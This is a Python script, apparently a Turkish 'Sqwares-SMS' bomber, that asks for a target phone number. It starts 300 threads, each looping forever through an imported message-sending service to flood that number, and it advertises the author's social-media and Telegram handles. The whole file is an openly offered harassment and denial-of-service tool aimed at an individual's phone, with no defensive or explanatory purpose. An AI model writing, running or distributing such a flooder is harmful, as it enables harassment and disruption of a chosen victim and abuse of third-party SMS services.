import sys, os, pyfiglet
from SqwareService import Distribution_Service
from threading import Thread
from colorama import Fore

attack_number_phone = Distribution_Service()

def start(phone):
        attack_number_phone.phone(phone)

        while True:
            try:
                attack_number_phone.random_service()
            except Exception as ex:
                print(ex)

os.system('clear')

print(Fore.YELLOW + pyfiglet.figlet_format("Sqwares-SMS"))

print('''
   _____                                   
  / ____|                                  
 | (___   __ ___      ____ _ _ __ ___  ___ 
  \___ \ / _` \ \ /\ / / _` | '__/ _ \/ __|
  ____) | (_| |\ V  V / (_| | | |  __/\__ \
 |_____/ \__, | \_/\_/ \__,_|_|  \___||___/
            | |                            
            |_|                            ''')

print('============')
print(Fore.GREEN + 'Tiktok: sqwares_')
print(Fore.GREEN + 'İnstagram: @sqwares_')
print(Fore.GREEN + 'Telegram: @Sqwares')
print(Fore.BLUE + '++++++++++++++++++')
print(Fore.RED + 'VİA: https://t.me/Sqwares')
print(Fore.BLUE + '++++++++++++++++++')
print(Fore.YELLOW + '============')
phone = input('NUMARA: ')
print('============')

try:
        attack_number_phone.phone(phone)
except:
        print(Fore.RED + 'Böyle Bir Numara Yok Top Benimi Kandırıyon Örnek: +905551235500')
        sys.exit()


for i in range(300):
        th = Thread(target=start, args=(phone,))
        th.start()
